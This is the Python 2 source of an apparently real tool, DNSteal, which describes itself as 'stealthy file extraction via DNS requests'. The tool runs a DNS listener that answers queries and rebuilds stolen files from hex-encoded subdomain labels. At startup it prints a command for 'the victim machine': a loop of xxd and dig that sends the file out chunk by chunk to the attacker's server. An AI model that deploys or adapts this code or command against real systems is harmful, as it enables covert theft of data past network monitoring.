import socket
import sys
import binascii
import time
import random
import hashlib
	
class DNSQuery:
  def __init__(self, data):
    self.data = data
    self.data_text = ''

    tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
    if tipo == 0:                     # Standard query
      ini=12
      lon=ord(data[ini])
      while lon != 0:
        self.data_text += data[ini+1:ini+lon+1]+'.'
        ini += lon+1
        lon=ord(data[ini])

  def request(self, ip):
    packet=''
    if self.data_text:
      packet+=self.data[:2] + "\x81\x80"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
      packet+=self.data[12:]                                         # Original Domain Name Question
      packet+='\xc0\x0c'                                             # Pointer to domain name
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
    return packet

def save_to_file(data, file_seed):

	fname = "recieved_%s.bin" % file_seed 
        print "\033[1;32m[!] Saving recieved bytes to ./%s\033[0m" % (fname)
	f = open(fname, "wb")

	for block in data:
		f.write(binascii.unhexlify(block))

	f.close()
	print "\033[1;32m[?] md5sum:\033[0m \033[1;31m%s\033[0m" % (hashlib.md5(open(fname, "r").read()).hexdigest())


def banner():

	print "\033[1;31m",
	print """
      ___  _  _ ___ _            _ 
     |   \| \| / __| |_ ___ __ _| |
     | |) | .` \__ \  _/ -_) _` | |
     |___/|_|\_|___/\__\___\__,_|_|

-- https://github.com/m57/dnsteal.git --\033[0m

Stealthy file extraction via DNS requests
"""

	
if __name__ == '__main__':

  try:

    ip = sys.argv[1]
  except:

    banner()
    print "Usage: %s [listen_address]"
    exit(1)

  banner()
  udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udp.bind((ip,53))

  print '\033[1;32m[+]\033[0m DNS listening on %s:53' % ip
  print "\033[1;32m[+]\033[0m Now on the victim machine, use the following command:"
  print "\033[1;31m[#]\033[0m for b in $(xxd -p file); do dig +short @%s $b.domain.com\n" % ip
  print "\033[1;32m[+]\033[0m Once file has sent, use Ctrl+C to exit and save.\n"
  
  file_seed = random.randint(1,32768)

  try:

    fdata = []

    while 1:
      
      data, addr = udp.recvfrom(1024)
      p=DNSQuery(data)
      udp.sendto(p.request(ip), addr)
      print 'Request: %s -> %s' % (p.data_text, ip)
      fdata.append(p.data_text.split(".")[0])


  except KeyboardInterrupt:

    save_to_file(fdata, file_seed)

    print '\n\033[1;31m[!]\033[0m Closing...'

    udp.close()
